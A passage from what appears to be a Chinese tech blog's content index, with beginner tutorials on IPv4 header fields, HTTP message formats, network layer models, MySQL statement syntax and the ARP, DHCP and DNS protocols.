首部校验和(16位) 12-15 源IP地址(32位) 16-19 目的IP地址(32位) 20+ 选项+填充(如果有，0-40字节) 按位分布详解 第0行（0-3字节）：\n1 2 3 4 5 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |版本| 首部长度 | 服务类型 | 总长度 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 第1行（4-7字节）：\n1 2 3 4 5 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | 标识符 |标志| 片偏移 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 第2行（8-11字节）：\n1 2 3 4 5 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | 生存时间 | 协议 | 首部校验和 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 第3-4行（12-19字节）：\n1 2 3 4 5 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | 源IP地址 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | 目的IP地址 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 第5行及以后（20+字节，如果有）：\n1 2 3 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | 选项 + 填充（如果有） | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 字段说明 第0-3字节字段\n版本：4位，IPv4为4，IPv6为6 首部长度：4位，以4字节为单位（最小值5，最大值15） 服务类型：8位，指定服务质量 总长度：16位，首部+数据的总字节数（最大值65535） 第4-7字节字段\n标识符：16位，用于分片重组 标志：3位（保留位、DF位、MF位） 片偏移：13位，以8字节为单位 第8-11字节字段\n生存时间：8位，经过路由器减1，为0时丢弃 协议：8位，上层协议类型 首部校验和：16位，只检验首部 第12-19字节字段\n源IP地址：32位 目的IP地址：32位 第20+字节字段（如果有）\n选项：可变长度，0-40字节 填充：确保首部是4字节的整数倍 协议字段值对照表 协议值 协议名称 说明 1 ICMP Internet控制报文协议，用于发送错误消息 2 IGMP Internet组管理协议，用于多播 6 TCP 传输控制协议，面向连接的可靠传输 17 UDP 用户数据报协议，无连接的不可靠传输 47 GRE 通用路由封装，用于VPN 50 ESP IPSec加密安全载荷，提供加密和认证 51 AH IPSec认证头，提供数据完整性 89 OSPF 开放最短路径优先，内部网关路由协议 服务类型(ToS)字段详解 位置 名称 值 含义 0-2 优先级 000 常规 001 优先 010 立即 011 闪电 100 覆盖 101 关键 110 网间控制 111 网络控制 3 延迟 0 正常延迟 1 低延迟 4 吞吐量 0 正常吞吐量 1 高吞吐量 5 可靠性 0 正常可靠性 1 高可靠性 6 成本 0 正常成本 1 最小成本 7 保留 0 保留未用 标志字段说明表 位 名称 值 含义 0 保留 0 必须为0 1 DF 0 允许分片 1 不允许分片 2 MF 0 最后的分片 1 还有分片 总结 IP数据报文的字段设计非常精巧，每个字段都有其特定的用途，共同保证了网络通信的可靠性和效率。理解这些字段的含义对于：\n网络故障排查 性能优化 安全防护 都有重要意义。\n","date":"2025-05-01T16:23:08+08:00","permalink":"https://souljian.cn/p/746087788/","title":"IP数据报文字段详解"},{"content":"HTTP请求报文结构 HTTP请求报文由三部分组成：\n请求行（Request Line） 请求头（Request Header） 请求体（Request Body） 1. 请求行 请求行包含三个重要信息：\n请求方法（GET、POST、PUT等） 请求URL HTTP协议版本 示例：\n1 GET /index.html HTTP/1.1 这个请求行表示：\n使用GET方法获取资源 请求的资源路径是/index.html 使用的是HTTP/1.1版本协议 2. 常见请求头字段 字段名 说明 Host 请求的服务器域名 User-Agent 客户端信息 Accept 客户端可接受的响应内容类型 Accept-Language 客户端可接受的语言 Accept-Encoding 客户端可接受的内容编码 Connection 连接管理，如keep-alive Cookie 客户端存储的Cookie信息 Content-Type 请求体的MIME类型 Content-Length 请求体的长度 3. 请求体 请求体包含发送给服务器的数据，常见于POST请求。数据格式可以是：\n1) application/x-www-form-urlencoded 最常见的POST提交数据方式 格式：key1=value1\u0026amp;key2=value2 特点： 数据会被URL编码（空格转换为+，特殊字符转换为ASCII HEX值） 适合简单的文本数据提交 示例： 1 username=张三\u0026amp;password=123456\u0026amp;age=25 这个示例表示：\n提交了三个字段：username、password和age 数据以键值对形式传输 使用\u0026amp;符号分隔不同的字段 所有数据都经过URL编码 2) application/json 现代API中最流行的数据格式 数据以JSON格式传输 特点： 支持复杂的数据结构（嵌套对象、数组等） 可读性好 数据类型丰富 示例： 1 2 3 4 5 6 7 8 9 { \u0026#34;username\u0026#34;: \u0026#34;张三\u0026#34;, \u0026#34;age\u0026#34;: 25, \u0026#34;hobbies\u0026#34;: [\u0026#34;读书\u0026#34;, \u0026#34;运动\u0026#34;], \u0026#34;address\u0026#34;: { \u0026#34;city\u0026#34;: \u0026#34;北京\u0026#34;, \u0026#34;street\u0026#34;: \u0026#34;朝阳区\u0026#34; } } 这个示例展示了JSON格式的优势：\n可以表示嵌套的数据结构（address是一个对象） 支持数组类型（hobbies是一个数组） 支持多种数据类型（字符串、数字） 层次结构清晰，易于阅读和解析 3) multipart/form-data 主要用于文件上传场景 特点： 可以同时上传文件和文本数据 每个表单项都有独立的边界字符串分隔 支持二进制文件传输 示例： 1 2 3 4 5 6 7 8 9 10 ------WebKitFormBoundary7MA4YWxkTrZu0gW Content-Disposition: form-data; name=\u0026#34;username\u0026#34; 张三 ------WebKitFormBoundary7MA4YWxkTrZu0gW Content-Disposition: form-data; name=\u0026#34;photo\u0026#34;; filename=\u0026#34;profile.jpg\u0026#34; Content-Type: image/jpeg [二进制文件内容] ------WebKitFormBoundary7MA4YWxkTrZu0gW-- 这个示例说明：\n使用特定的边界字符串分隔不同的表单项 可以同时上传文本（username）和文件（photo） 每个部分都有自己的Content-Disposition说明 文件上传部分包含文件名和文件类型信息 HTTP响应报文结构 HTTP响应报文也由三部分组成：\n状态行（Status Line） 响应头（Response Header） 响应体（Response Body） 1. 状态行 状态行包含：\nHTTP协议版本 状态码 状态描述 示例：\n1 HTTP/1.1 200 OK 这个状态行表示：\n使用HTTP/1.1版本协议 状态码是200，表示请求成功 OK是对状态码的文字描述 2. 常见状态码 状态码 类别 说明 1xx 信息性状态码 请求已接收，继续处理 2xx 成功状态码 请求已成功接收、理解、接受 3xx 重定向状态码 需要进一步操作以完成请求 4xx 客户端错误状态码 请求包含语法错误或无法完成请求 5xx 服务器错误状态码 服务器在处理请求时发生错误 常见状态码：\n200 OK：请求成功 301 Moved Permanently：永久重定向 302 Found：临时重定向 400 Bad Request：客户端请求语法错误 401 Unauthorized：请求需要用户认证 403 Forbidden：服务器拒绝请求 404 Not Found：请求的资源不存在 500 Internal Server Error：服务器内部错误 503 Service Unavailable：服务器暂时无法处理请求 3. 常见响应头字段 字段名 说明 Server 服务器软件信息 Content-Type 响应体的MIME类型 Content-Length 响应体的长度 Content-Encoding 响应体的编码方式 Cache-Control 缓存控制 Set-Cookie 设置Cookie Location 重定向的目标URL Access-Control-Allow-Origin CORS跨域允许的来源 完整示例 GET请求示例 1 2 3 4 GET /api/users HTTP/1.1 Host: api.example.com User-Agent: Mozilla/5.0 Accept: application/json 这个GET请求示例说明：\n使用GET方法请求/api/users接口 请求发送到api.example.com服务器 使用Mozilla/5.0浏览器发送请求 期望接收JSON格式的响应 POST请求示例 1 2 3 4 5 6 7 8 9 POST /api/users HTTP/1.1 Host: api.example.com Content-Type: application/json Content-Length: 57 { \u0026#34;username\u0026#34;: \u0026#34;john_doe\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;john@example.com\u0026#34; } 这个POST请求示例说明：\n使用POST方法向/api/users接口提交数据 发送JSON格式的数据 请求体包含用户名和邮箱信息 Content-Length指明了请求体的长度 响应示例 1 2 3 4 5 6 7 8 9 10 11 12 HTTP/1.1 200 OK Content-Type: application/json Content-Length: 234 { \u0026#34;status\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;id\u0026#34;: 1, \u0026#34;username\u0026#34;: \u0026#34;john_doe\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;john@example.com\u0026#34; } } 这个响应示例说明：\n请求处理成功（状态码200） 返回JSON格式的数据 响应体包含状态信息和用户数据 服务器成功创建了用户并返回了用户ID multipart/form-data示例（文件上传） 1 2 3 4 5 6 7 8 9 10 ------WebKitFormBoundary7MA4YWxkTrZu0gW # 分隔边界线，用于分隔不同的表单项 Content-Disposition: form-data; name=\u0026#34;username\u0026#34; # 第一个表单项：普通文本字段 张三 # 字段值 ------WebKitFormBoundary7MA4YWxkTrZu0gW # 分隔边界线 Content-Disposition: form-data; name=\u0026#34;photo\u0026#34;; filename=\u0026#34;profile.jpg\u0026#34; # 第二个表单项：文件上传 Content-Type: image/jpeg # 上传文件的MIME类型 [二进制文件内容] # 实际的文件内容 ------WebKitFormBoundary7MA4YWxkTrZu0gW-- # 结束边界线（注意末尾有--） application/x-www-form-urlencoded示例 1 2 3 4 5 6 POST /login HTTP/1.1 # 请求行：POST方法，用于登录 Host: example.com # 请求的目标主机名 Content-Type: application/x-www-form-urlencoded # 内容类型为表单数据 Content-Length: 38 # 请求体长度 username=张三\u0026amp;password=123456\u0026amp;remember=true # 请求体：键值对格式，使用\u0026amp;分隔 带Cookie的请求示例 1 2 3 4 GET /api/profile HTTP/1.1 # 请求行：GET方法，获取用户资料 Host: api.example.com # 请求的目标主机名 Cookie: sessionId=abc123; userId=789 # Cookie信息，包含会话ID和用户ID Accept: application/json # 期望接收JSON格式的响应 重定向响应示例 1 2 3 4 HTTP/1.1 302 Found # 状态行：302表示临时重定向 Location: https://new.example.com/page # 重定向的目标URL Cache-Control: no-cache # 缓存控制：不使用缓存 Set-Cookie: session=def456; Path=/ # 设置新的Cookie ","date":"2025-05-01T16:21:56+08:00","permalink":"https://souljian.cn/p/746087716/","title":"HTTP请求报文字段和响应字段报文"},{"content":"OSI七层模型 OSI（Open Systems Interconnection）模型是国际标准化组织（ISO）定义的一个概念模型，将计算机网络体系结构分为七层。从上到下分别是：\n7. 应用层（Application Layer） 功能：为应用程序提供网络服务 协议：HTTP、FTP、SMTP、DNS等 数据单位：数据（Data） 6. 表示层（Presentation Layer） 功能：数据格式转换、加密解密、压缩解压缩 处理：字符编码、数据加密、压缩等 数据单位：数据（Data） 5. 会话层（Session Layer） 功能：建立、管理和终止会话 处理：会话协调、同步 数据单位：数据（Data） 4. 传输层（Transport Layer） 功能：端到端的可靠数据传输 协议：TCP、UDP 数据单位：段（Segment） 3. 网络层（Network Layer） 功能：路由选择和逻辑寻址 协议：IP、ICMP、IGMP 数据单位：包（Packet） 2. 数据链路层（Data Link Layer） 功能：物理寻址，错误侦测与修正 协议：以太网、PPP 数据单位：帧（Frame） 1. 物理层（Physical Layer） 功能：比特流的传输 设备：网线、集线器等 数据单位：比特（Bit） TCP/IP五层模型 TCP/IP模型是实际互联网的实现标准，它将OSI模型简化为五层：\n5. 应用层 对应OSI的应用层、表示层和会话层 主要协议：HTTP、FTP、SMTP、DNS等 4. 传输层 与OSI的传输层对应 主要协议：TCP（可靠传输）、UDP（不可靠传输） 3. 网络层 与OSI的网络层对应 主要协议：IP、ICMP、IGMP 2. 数据链路层 与OSI的数据链路层对应 处理物理地址和错误检测 1. 物理层 与OSI的物理层对应 处理比特流的传输 两种模型的对比 相同点 都采用了分层的结构 都是为了解决异构网络互联问题 都遵循协议独立的原则 不同点 OSI是理论上的模型，TCP/IP是实际应用的模型 OSI分为七层，TCP/IP合并了一些功能层，简化为五层 TCP/IP模型更加灵活和实用，是实际互联网的基础 总结 虽然OSI模型在理论上更为完整，但TCP/IP模型因其简洁性和实用性成为了实际互联网的标准。理解这两个模型对于网络工程师和开发人员来说都是非常重要的基础知识。在实际应用中，我们主要使用TCP/IP模型，但OSI模型提供的概念框架仍然具有重要的参考价值。\n","date":"2025-05-01T16:13:05+08:00","permalink":"https://souljian.cn/p/746087185/","title":"OSI七层模型和TCP/IP 五层模型"},{"content":"DCL语句(数据控制语言，用来创建数据库用户，控制数据库的访问权限) 用户管理 查询用户\nuse mysql;\nselect * from user;\n创建用户\ncreate user '用户名'@'主机名' identified by '密码'; 修改用户密码\nalter user '用户名''@主机名' identified with mysql_native_password by '新密码'; 删除用户\ndrop user '用户名'@'主机名'; 注意:\n主机名可以使用通配符(%) DCL语句一般用语数据库管理人员使用 权限说明 Mysql中定义了很多种权限,但常用的就以下几种: 权限 说明 ALL / ALL PRIVILEGES 所有权限 SELECT 查询数据 INSERT 插入数据 UPDATE 修改数据 DELETE 删除数据 ALTER 修改表结构 DROP 删除数据库/表/视图 CREATE 创建数据库/表 权限控制 查询权限 show grants for '用户名'@'ip白名单' 授予权限 grant 权限列表 on 数据库名.表名 to '用户名'@'ip白名单' 撤销权限 revoke 权限列表 on 数据库名.表名 from '用户名'@'ip白名单' 注意:\n多个权限之间,使用逗号分开 授权时,数据库名和表名可以是用通配符*,代表所有 ","date":"2025-04-30T23:29:55+08:00","permalink":"https://souljian.cn/p/746026995/","title":"Mysql DCL语句使用"},{"content":"DQL语句(数据查询语言，用来查询数据库中表的数据) 基本语法 -\tselect 字段列表 -\tfrom 表名列表 -\twhere 条件列表 -\tgroup by 分组字段列表 -\thaving 分组后条件列表 -\tordey by 排序字段列表 -\tlimit 翻页参数 基本查询 查询字段\n查询多个字段select 字段1,字段2,字段3...from 表名 查询所有字段select * from 表名 设置别名select 字段[as 别名1],[as 别名2]...from表名\n去除重复记录select distinct 字段列表 from 表名\n条件查询 语法\nselect 字段列表 from 表名 where 条件列表; 条件\n比较运算符 功能 逻辑运算符 功能 \u0026gt; 大于 AND 或 \u0026amp;\u0026amp; 并且（多个条件同时成立） \u0026gt;= 大于等于 OR 或 || 或者（多个条件任意一个成立） \u0026lt; 小于 NOT 或 ! 非，不是 \u0026lt;= 小于等于 = 等于 \u0026lt;\u0026gt; 或 != 不等于 BETWEEN … AND … 在某个范围之内（含最小、最大值） IN(…) 在 in 之后的列表中的值（多选一） LIKE 模糊匹配（_匹配单个字符，%匹配任意字符） IS NULL 是 NULL 聚合函数 介绍\n将一列数据为一个整体,进行纵向计算 常见的聚合函数\n函数 功能 count 统计数量 max 最大值 min 最小值 avg 平均值 sum 求和 语法\nselect 聚合函数(字段列表) from 表名; 分组查询 语法 select 字段列表 from 表名 [where 条件] group by 分组字段名 [having 分组后的过滤条件] where条件和having条件的区别: 执行时机不同:where是分组之前执行,不满足where条件,不参加分组,而having是对分组之后的结果进行过滤 判断条件不同:where不能对聚合函数进行判断,而having可以 排序查询 语法 select 字段列表 from 表名 order by 字段1 排序方式1,字段2 排序方式2; 排序方式: asc：升序(默认) desc:降序 ​ 注意:如果是多字段排序,当第一个字段值相同时,才会根据第二个字段进行排序\n分页查询 语法 select 字段列表 from 表名 limit 起始索引,查询记录 注意 起始索引从0开始,起始索引=(查询页码-1)*每页显示记录数 分页查询是数据库的方言,因为不同的数据库有不同的是实现方法,MySQL中使用的是的limit 如果查询的第一页数据,起始索引可以省略,直接简写成limit 10 执行顺序和执行顺序 编写顺序（书写SQL时的顺序） SELECT - 字段列表 FROM - 表名列表 WHERE - 条件列表 GROUP BY - 分组字段列表 HAVING - 分组后条件列表 ORDER BY - 排序字段列表 LIMIT - 分页参数 执行顺序（数据库实际执行的顺序） 顺序 关键字 作用 对应编写顺序编号 1 FROM 确定数据来源表 2 2 WHERE 行级条件过滤 3 3 GROUP BY 分组操作 4 4 HAVING 组级条件过滤 5 5 SELECT 选择输出字段/聚合计算 1 6 ORDER BY 结果排序 6 7 LIMIT 分页限制 7 ","date":"2025-04-30T22:28:09+08:00","permalink":"https://souljian.cn/p/746023289/","title":"Mysql DQL语句使用"},{"content":"DML语句(数据库操作语言，用来对数据库表中的数据进行增删改) 添加数据 给指定字段添加数据insert into 表名(字段名1，字段名2,...)values(值1，值2,... 给全部字段添加数据insert into 表名 values(值1，值2,...) 批量添加数据 1 2 insert into 表名(字段名1，字段名2,...)values(值1,值2,...),(值1,值2,...),(值1,值2,...) //为当前表中指定字段赋值 insert into 表名 values(值1,值2,...),(值1,值2,...),(值1,值2,...) //为当前表中所有字段赋值 注意：\n插入数据是，指定的字段顺序需要与值的顺序是一 一对应的 字符串类型和日期类型需要包含在引号中 插入的数据大小，应该在字段的规定范围内 修改数据 修改表中的数据update 表名 set 字段1=值1，字段2=值2,...[where 条件] 注意：修改语句的条件可以有，也可以没有，如果没有条件，则会修改整张表的所有数据\n删除数据 删除表中的数据 delete from 表名 [where 条件] **注意 ** :\ndelete 语句的条件可以有,也可以没有,.如果没有条件,则会删除整张表的所有数据 delete 语句不能删除某一个字段的值(可以使用update) ","date":"2025-04-30T20:22:44+08:00","permalink":"https://souljian.cn/p/746015764/","title":"Mysql DML语句使用"},{"content":" 数据类型 MySQL 数值类型 分类 类型 大小 有符号(SIGNED)范围 无符号(UNSIGNED)范围 描述 数值类型 TINYINT 1 byte (-128, 127) (0, 255) 小整数值 数值类型 SMALLINT 2 bytes (-32768, 32767) (0, 65535) 大整数值 数值类型 MEDIUMINT 3 bytes (-8388608, 8388607) (0, 16777215) 大整数值 数值类型 INT/INTEGER 4 bytes (-2147483648, 2147483647) (0, 4294967295) 大整数值 数值类型 BIGINT 8 bytes (-2^63, 2^63-1) (0, 2^64-1) 极大整数值 数值类型 FLOAT 4 bytes 约(-3.4E+38, 3.4E+38) 约(0, 3.4E+38) 单精度浮点数 数值类型 DOUBLE 8 bytes 约(-1.8E+308, 1.8E+308) 约(0, 1.8E+308) 双精度浮点数 数值类型 DECIMAL 可变 取决于M(精度)和D(标度) 取决于精度和标度 精确小数 MySQL 字符串类型 分类 类型 大小 描述 字符串类型 CHAR 0-255 bytes 定长字符串 字符串类型 VARCHAR 0-65535 bytes 变长字符串 字符串类型 TINYBLOB 0-255 bytes 不超过255个字符的二进制数据 字符串类型 TINYTEXT 0-255 bytes 短文本字符串 字符串类型 BLOB 0-65535 bytes 二进制形式的长文本数据 字符串类型 TEXT 0-65535 bytes 长文本数据 字符串类型 MEDIUMBLOB 0-16,777,215 bytes 二进制形式的中等长度文本数据 字符串类型 MEDIUMTEXT 0-16,777,215 bytes 中等长度文本数据 字符串类型 LONGBLOB 0-4,294,967,295 bytes 二进制形式的极大文本数据 字符串类型 LONGTEXT 0-4,294,967,295 bytes 极大文本数据 MySQL 日期和时间类型 分类 类型 大小(字节) 范围 格式 描述 日期类型 DATE 3 1000-01-01 至 9999-12-31 YYYY-MM-DD 纯日期值 日期类型 TIME 3 -838:59:59 至 838:59:59 HH:MM:SS 时间值或持续时间 日期类型 YEAR 1 1901 至 2155 YYYY 年份值 日期类型 DATETIME 8 1000-01-01 00:00:00 至 9999-12-31 23:59:59 YYYY-MM-DD HH:MM:SS 混合日期和时间值 日期类型 TIMESTAMP 4 1970-01-01 00:00:01 至 2038-01-19 03:14:07 YYYY-MM-DD HH:MM:SS 时间戳（自动时区转换） ","date":"2025-04-29T23:07:44+08:00","permalink":"https://souljian.cn/p/745939264/","title":"Mysql数据类型"},{"content":"DDL语句(数据定义语言，用来定义数据库中的（数据库、表、字段)): DDL语句操作数据库 查询：\n查询所有数据库 show databases; 查询当前数据库select database(); 创建\n创建crrate database [if not exists] 数据库名 [default charset]字符集[collate]排序规则 删除\n删除drop database [if exists]数据库名 使用\n使用use 数据库名 DDL语句-操作表 创建表 1 2 3 4 5 6 7 8 9 10 create table 表名( 字段1 字段1类型[COMMENT 字段1注释], 字段2 字段2类型[COMMENT 字段2注释], 字段3 字段3类型[COMMENT 字段3注释], ... 字段n 字段n类型[COMMENT 字段n注释] )[COMMENT 表注释]; 注意: ...为可选参数,最后一个字段后面没有逗号 修改表 添加字段 alter table 表名 add 字段名 类型(长度) [comment 注释][约束]; 修改数据类型alter table 表名 modify 字段名 新数据类型(长度) 修改字段名的字段类型alter table 表名 change 旧字段名 新字段名 类型(长度)[comment 注释][约束] 删除字段alter table 表名 drop 字段名 修改表名alter table 表名 rename to 新表名 查询表 查询当前数据库所有表show tables; 查询表结构 desc 表名\n查询指定表的建表语句show create table 表名\n删除表 清空表内数据(删除表并重新创建新表)truncate table 表名\n删除指定表表drop table[if exists]表名\n","date":"2025-04-29T23:05:43+08:00","permalink":"https://souljian.cn/p/745939143/","title":"Mysql  DDL语句使用"},{"content":"一、ARP协议简介 定义\nARP（Address Resolution Protocol，地址解析协议）是一种网络协议，用于将网络层的IP地址解析为链路层的MAC地址。 它是网络通信的基础协议之一，确保数据能够在同一网络内部正确传输。 工作原理\nARP请求：\n当主机A需要向主机B发送数据时，它会先检查自己的ARP缓存，看是否已经存储了主机B的IP地址与MAC地址的映射关系。 如果没有找到，主机A会在本地网络中广播一个ARP请求报文，询问\u0026quot;谁拥有IP地址X？请告诉我你的MAC地址。\u0026quot; ARP响应：\n主机B收到ARP请求后，会发送一个ARP响应报文，告诉主机A自己的MAC地址。 更新ARP缓存：\n主机A收到响应后，将主机B的IP地址和MAC地址的映射关系存储在自己的ARP缓存中，以便后续通信。 ARP缓存中的条目有一定的生存时间（TTL），过期后会被删除，以避免缓存中的信息过时。 二、ARP协议的作用 IP地址与MAC地址的转换：\nIP地址是网络层的逻辑地址，用于在不同网络之间进行路由。 MAC地址是链路层的物理地址，用于在同一网络内部进行数据传输。 ARP协议通过将IP地址解析为MAC地址，确保数据能够在同一网络内部正确传输。 支持网络通信：\nARP协议是网络通信的基础协议之一，它与IP协议、TCP协议等协同工作，确保数据能够在网络中正确传输。 三、ARP协议的限制 仅限于同一网络：\nARP协议仅适用于同一局域网内部的通信，无法跨网络工作。 跨网络的通信需要通过路由器进行IP地址的路由。 安全性问题：\nARP协议本身没有加密或认证机制，容易受到ARP攻击。 四、例子解释说明 假设在一个局域网中有两台主机：主机A（IP地址为192.168.1.100，MAC地址为00:11:22:33:44:55）和主机B（IP地址为192.168.1.101，MAC地址为AA:BB:CC:DD:EE:FF）。\n主机A需要向主机B发送数据：\n主机A检查自己的ARP缓存，发现没有主机B的IP地址与MAC地址的映射关系。 主机A发送ARP请求：\n主机A在局域网中广播一个ARP请求报文：\u0026ldquo;谁拥有IP地址192.168.1.101？请告诉我你的MAC地址。\u0026rdquo; 主机B响应ARP请求：\n主机B收到ARP请求后，发送一个ARP响应报文：\u0026ldquo;我是192.168.1.101，我的MAC地址是AA:BB:CC:DD:EE:FF。\u0026rdquo; 主机A更新ARP缓存：\n主机A收到ARP响应后，将主机B的IP地址和MAC地址的映射关系存储在自己的ARP缓存中。 之后，主机A就可以直接使用主机B的MAC地址发送数据了。 ","date":"2025-04-22T22:47:46+08:00","permalink":"https://souljian.cn/p/745333266/","title":"ARP协议"},{"content":" 一、DHCP协议简介 采用UDP协议，67/68端口\nDHCP（Dynamic Host Configuration Protocol，动态主机配置协议）是一种网络协议，用于自动分配IP地址和其他网络配置参数（如子网掩码、默认网关、DNS服务器地址等）。它简化了网络设备的配置过程，尤其是对于频繁接入和离开网络的设备（如笔记本电脑、手机等）。\n二、DHCP工作原理 DHCP协议的工作过程主要分为以下几个阶段：\n1. 发现阶段（Discovery） 当设备（如电脑）接入网络时，它会广播一个 DHCP Discover 数据包，询问网络中是否有可用的DHCP服务器。 由于设备还不知道自己属于哪个网络，因此它会使用广播地址（如 255.255.255.255）发送数据包。 2. 提供阶段（Offer） 网络中的DHCP服务器收到 DHCP Discover 数据包 后，会从其可用的IP地址池中选择一个未分配的IP地址，并向客户端发送一个 DHCP Offer 数据包。 DHCP Offer 数据包 中包含分配给客户端的IP地址、子网掩码、租期（IP地址的有效时间，有线默认8天，无线默认8小时）以及其他网络配置参数。 3. 请求阶段（Request） 客户端收到 DHCP Offer 数据包 后，会发送一个 DHCP Request 数据包，正式请求接受这个IP地址。 如果客户端收到多个DHCP服务器的Offer（在多台DHCP服务器的环境中），它会选择一个Offer，并向所有DHCP服务器发送 DHCP Request 数据包，通知其他服务器它已经选择了某个IP地址。 4. 确认阶段（Acknowledge） DHCP服务器收到 DHCP Request 数据包 后，会检查所分配的IP地址是否仍然可用。 如果IP地址可用，服务器会发送一个 DHCP Ack 数据包，正式确认分配的IP地址，并通知客户端可以使用该IP地址。 如果IP地址已经被占用或其他问题导致无法分配，服务器会发送一个 DHCP Nak 数据包，拒绝分配，并提示客户端重新请求（从第一阶段重来）。 三、DHCP的优势 自动化配置：设备接入网络后自动获取IP地址，无需手动配置，大大简化了网络管理。 避免冲突：DHCP服务器会检查IP地址是否已被占用，从而避免IP地址冲突。 集中管理：网络管理员可以通过DHCP服务器集中管理IP地址分配，方便调整网络配置。 灵活性：可以根据需要动态调整IP地址池和租期，适应不同的网络需求。 四、DHCP的局限性 依赖服务器：如果DHCP服务器故障，新设备将无法获取IP地址。 安全性问题：未经授权的设备可能会接入网络并获取IP地址，存在安全隐患。 配置复杂性：在大型网络中，配置和管理DHCP服务器可能较为复杂。 五、DHCP的生动例子 假设你去参加一个大型聚会，但你不知道自己的座位在哪里。于是你开始了一段寻找座位的旅程：\n发现阶段（Discovery） 你进入聚会场地后，大声喊：\u0026ldquo;有人能告诉我我的座位在哪里吗？\u0026quot;（广播 DHCP Discover 数据包）。 提供阶段（Offer） 聚会的主持人（DHCP服务器）听到你的喊声后，查看座位安排表（IP地址池），找到一个空座位，并对你说：\u0026ldquo;你可以坐那边的座位。\u0026quot;（发送 DHCP Offer 数据包）。 请求阶段（Request） 你听到主持人的话后，回应说：\u0026ldquo;好的，我接受这个座位。\u0026quot;（发送 DHCP Request 数据包）。 确认阶段（Acknowledge） 主持人确认你接受了座位后，正式对你说：\u0026ldquo;欢迎你坐下，这个座位是你的了。\u0026quot;（发送 DHCP Ack 数据包）。 通过这个过程，你成功找到了自己的座位。DHCP协议的工作原理也是如此，帮助设备在复杂的网络环境中自动找到属于自己的IP地址。\n","date":"2025-04-22T22:47:12+08:00","permalink":"https://souljian.cn/p/745333232/","title":"DHCP协议及IP自动获取"},{"content":" 一、DNS协议简介 DNS（Domain Name System）即域名系统，是互联网中用于将域名转换为IP地址的协议。它解决了用户记忆IP地址的困难，使得用户可以通过易于记忆的域名来访问网络资源。\n二、域名解析过程 1. 本地缓存查询 当用户输入一个域名时，计算机首先会在本地缓存中查找是否有该域名对应的IP地址。如果找到，直接返回IP地址，无需进一步查询。\n2. 本地DNS服务器查询 如果本地缓存中没有找到，计算机将向本地DNS服务器（通常是ISP（互联网服务提供商）提供的DNS服务器）发送查询请求。本地DNS服务器会检查自己的缓存，如果找到对应的IP地址，返回给用户；如果没有，进入下一步。\n3. 递归查询与迭代查询 递归查询：本地DNS服务器向其他DNS服务器查询，直到找到目标IP地址并返回给用户。用户只需等待最终结果，无需关心查询过程。 迭代查询：本地DNS服务器向其他DNS服务器发送查询请求后，返回一个指向其他DNS服务器的地址，由用户自己继续查询，直到找到目标IP地址。 4. 根域名服务器查询 如果本地DNS服务器无法找到目标IP地址，会向根域名服务器（如.com、.org等顶级域名服务器）查询。根域名服务器会返回一个指向权威DNS服务器的地址。\n5. 权威DNS服务器查询 最终，查询请求会到达权威DNS服务器，它会返回域名对应的IP地址。\n6. 缓存更新 查询结果会被本地DNS服务器和用户的计算机缓存起来，以便下次快速查询。\n三、DNS协议的重要性 方便用户访问：用户无需记忆复杂的IP地址，只需输入域名即可访问网站。 负载均衡：通过DNS可以将流量分配到多个服务器，提高网站的可用性和性能。 故障转移：当某个服务器出现故障时，DNS可以将流量重定向到备用服务器，确保服务的连续性。 四、DNS攻击 DNS劫持：攻击者篡改DNS解析结果，将用户引导到恶意网站。 DNS缓存污染：攻击者向DNS缓存中注入错误的IP地址，导致用户访问错误的网站。 DDoS攻击：攻击者通过大量虚假DNS查询请求，使DNS服务器瘫痪。 五、DNS解析的生动例子 假设你正在寻找一家名为\u0026quot;快乐汉堡\u0026quot;的餐厅。你只知道餐厅的名字，但不知道它的具体地址。于是你开始了一段寻找之旅：\n本地缓存查询 你先问自己的朋友（本地缓存）：\u0026ldquo;你知道快乐汉堡在哪里吗？\u0026ldquo;如果朋友知道，直接告诉你地址，你就直接去了。\n本地DNS服务器查询 如果朋友不知道，你会去问本地的导航站（本地DNS服务器）：\u0026ldquo;你知道快乐汉堡在哪里吗？\u0026ldquo;导航站会查自己的地图（缓存），如果找到了，告诉你地址；如果没有，进入下一步。\n递归查询与迭代查询\n递归查询：导航站会帮你去问其他导航站，直到找到地址，然后告诉你。 迭代查询：导航站会告诉你去下一个导航站，你自己继续问，直到找到地址。 根域名服务器查询 如果本地导航站也不知道，它会带你去城市的中心导航站（根域名服务器），那里会告诉你去哪个区域的导航站（权威DNS服务器）。\n权威DNS服务器查询 最后，你到了区域导航站（权威DNS服务器），它会告诉你\u0026quot;快乐汉堡\u0026quot;的具体地址。\n缓存更新 